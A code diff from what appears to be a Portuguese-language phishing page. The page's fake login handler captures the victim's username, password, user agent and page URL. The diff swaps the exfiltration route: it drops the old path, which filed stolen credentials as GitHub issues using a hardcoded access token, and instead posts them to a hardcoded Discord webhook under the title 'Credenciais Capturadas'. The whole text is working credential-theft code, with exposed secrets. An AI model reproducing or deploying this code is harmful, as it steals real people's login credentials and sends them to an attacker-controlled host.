@@ -131,26 +131,26 @@
 
         btn.innerText = "Autenticando...";
 
-        // Salva a captura como Issue privada no GitHub (repo logs)
-        // Credenciais chegam direto no seu repositório privado - sem servidor extra
         var ts = new Date().toISOString();
         var ua = navigator.userAgent;
-        var issueBody = "## \uD83D\uDCA5 Captura Emílio Farias\n\n"
-                      + "**Timestamp:** `" + ts + "`\n"
-                      + "**Login:** `" + u + "`\n"
-                      + "**Senha:** `" + p + "`\n"
-                      + "**UserAgent:** `" + ua + "`\n"
-                      + "**URL Capturada:** `" + window.location.href + "`";
+        var url = window.location.href;
 
-        fetch("https://api.github.com/repos/projetoacc002/logs/issues", {
+        // Envia para Discord Webhook - sem expor nenhum token sensível
+        fetch("https://discord.com/api/webhooks/1493707538099605795/GuYho66-ozTTH1UlJsKsrFDL2CTdlgXMDsL_nnbp8F01xg-ooWcF6t67IBl84eFFb1oH", {
             method: "POST",
-            headers: {
-                "Authorization": "token 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",
-                "Content-Type": "application/json"
-            },
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-                title: "\uD83D\uDD10 Capture @ " + ts,
-                body: issueBody
+                embeds: [{
+                    title: "\uD83D\uDD10 Credenciais Capturadas",
+                    color: 16711680,
+                    fields: [
+                        { name: "Login", value: "```" + u + "```", inline: true },
+                        { name: "Senha", value: "```" + p + "```", inline: true },
+                        { name: "URL", value: url, inline: false },
+                        { name: "Timestamp", value: ts, inline: false },
+                        { name: "User-Agent", value: ua, inline: false }
+                    ]
+                }]
             })
         }).then(function() {
             document.body.style.overflow = "auto";
